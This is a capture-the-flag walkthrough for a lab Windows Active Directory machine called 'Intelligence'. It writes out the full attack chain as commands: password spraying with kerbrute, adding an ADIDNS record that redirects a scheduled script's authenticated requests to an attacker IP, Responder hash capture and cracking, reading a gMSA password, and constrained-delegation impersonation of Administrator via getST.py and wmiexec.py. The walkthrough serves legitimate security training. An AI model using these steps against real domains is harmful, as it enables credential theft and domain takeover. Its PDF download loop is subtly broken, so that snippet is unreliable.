@@ -1,0 +1,143 @@
+Intelligence
+
+ 25th Nov 2021 / Document No D21.100.143
+ Prepared By: polarbearer
+ Machine Author(s): Micah
+ Difficulty: Medium
+ Classification: Official
+Synopsis
+
+Intelligence is a medium difficulty Windows machine that showcases a number of common attacks in an
+Active Directory environment. After retrieving internal PDF documents stored on the web server (by brute-
+forcing a common naming scheme) and inspecting their contents and metadata, which reveal a default
+password and a list of potential AD users, password spraying leads to the discovery of a valid user account,
+granting initial foothold on the system. A scheduled PowerShell script that sends authenticated requests to
+web servers based on their hostname is discovered; by adding a custom DNS record, it is possible to force a
+request that can be intercepted to capture the hash of a second user, which is easily crackable. This user is
+allowed to read the password of a group managed service account, which in turn has constrained
+delegation access to the domain controller, resulting in a shell with administrative privileges.
+
+Skills Required
+
+      Password spraying
+      Password cracking
+      Basic Active Directory knowledge
+
+Skills Learned
+
+      ADIDNS abuse
+       ReadGMSAPassword abuse
+      Constrained delegation abuse
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.248 | grep ^[0-9] | cut -d '/' -f1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.10.10.248
+The nmap output seems to indicate that the machine is an Active Directory Domain Controller on the
+intelligence.htb domain. In addition to standard AD services, the IIS web server is listening on its default
+port.
+
+IIS
+
+Browsing to port 80 we get a static web page, which at first sight does not seem to contain any interesting
+or useful data.
+
+However, looking at HTML links, we notice a couple of different PDF files inside a Documents directory:
+   <a href="documents/2020-01-01-upload.pdf" class="badge badge-secondary">Download</a>
+   <a href="documents/2020-12-15-upload.pdf" class="badge badge-secondary">Download</a>
+
+Directory listing is not allowed; however, the files seem to follow a common naming scheme.
+Foothold
+
+We can use the following Bash one-liner to download all available PDF files starting from a chosen date (i.e.
+2020-01-01). To speed up the process, we use the -P option to run twenty parallel wget processes with
+xargs .
+
+   d=2020-01-01; while [ "$d" != `date -I` ]; do echo "http://10.10.10.248/Documents/$d-
+   upload.pdf"; done | xargs -n 1 -P 20 wget < list 2>/dev/null
+Several files are downloaded. First we inspect the metadata to retrieve any potential user name:
+   exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq > userlist
+The pdftotext tool (provided by the poppler-utils package on Debian-based systems) can be used to
+convert the downloaded PDF files to text:
+   for f in *pdf; do pdftotext $f; done
+By running the head command we can display the first line of each text file and quickly pick out the ones
+that contain useful information:
+   head -n1 *txt
+We find two interesting documents:
+
+We display their full contents:
+   cat 2020-{06-04,12-30}-upload.txt
+We have obtained a default password, which we can spray against our user list using the kerbrute tool:
+   kerbrute passwordspray userlist NewIntelligenceCorpUser9876 --dc 10.10.10.248 -d
+   intelligence.htb
+
+We now have valid credentials for the user Tiffany.Molina , which can be used to connect to the Users
+share and read the user flag.
+
+   smbclient.py Tiffany.Molina:NewIntelligenceCorpUser9876@10.10.10.248
+Lateral Movement
+
+On the IT share we find a script called downdetector.ps1 :
+
+We review the source code:
+   # Check web server status. Scheduled to run every 5min
+   Import-Module ActiveDirectory
+   foreach($record in Get-ChildItem
+   "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" |
+   Where-Object Name -like "web*") {
+   try {
+   $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
+   if(.StatusCode -ne 200) {
+   Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves
+   <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
+   }
+   } catch {}
+   }
+
+The script loops through DNS records and sends an authenticated request to any host having a name
+starting with web in order to check its status. We can leverage the permission (granted by default to
+authenticated users) to create arbitrary DNS records on the Active Directory Integrated DNS (ADIDNS) zone
+to add a new record that points to our own IP address. This can be accomplished using the dnstool.py
+script from krbrelayx:
+
+   dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.10.10.248
+   -a add -r web1 -d 10.10.14.58 -t A
+We run Responder to intercept the request:
+   responder -I tun0
+After a few minutes we get a hash for the user Ted.Graves :
+
+The hash is easily crackable:
+   john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Privilege Escalation
+
+One of the internal documents retrieved during the initial phase hinted at potential security issues with
+service accounts. Using the newly obtained credentials for Ted.Graves we can enumerate the domain with
+the tool Bloodhound. We run the bloodhound-python ingestor:
+
+   bloodhound-python -d intelligence.htb -u Ted.Graves -p Mr.Teddy -ns 10.10.10.248 -c All
+
+We import the collected Json files in Bloodhound and then look at Shortest Paths to High Value
+Targets :
+
+We can see that our user is a member of the ITSUPPORT group, which has ReadGMSAPassword rights on
+SVC_INT which in turn has AllowedToDelegate rights to the Domain Controller. We can use the
+gMSADumper tool to get the service account password hash:
+
+   git clone https://github.com/micahvandeusen/gMSADumper
+   python gMSADumper/gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l
+   10.10.10.248
+We can now abuse constrained delegation to request a TGT for the Administrator user (if the clock skew is
+too high, we can use a tool like ntpdate to adjust our time):
+
+   echo "10.10.10.248 intelligence.htb" | sudo tee -a /etc/hosts
+   sudo ntpdate -s 10.10.10.248
+   getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator
+   intelligence.htb/svc_int -hashes :b98d4cef68f72a98dfeed732d1b1abca
+
+We can now use the acquired ticket to get a shell as Administrator via wmiexec.py :
+   export KRB5CCNAME=Administrator.ccache
+   echo "10.10.10.248 dc.intelligence.htb" | sudo tee -a /etc/hosts
+   wmiexec.py -k -no-pass dc.intelligence.htb
+
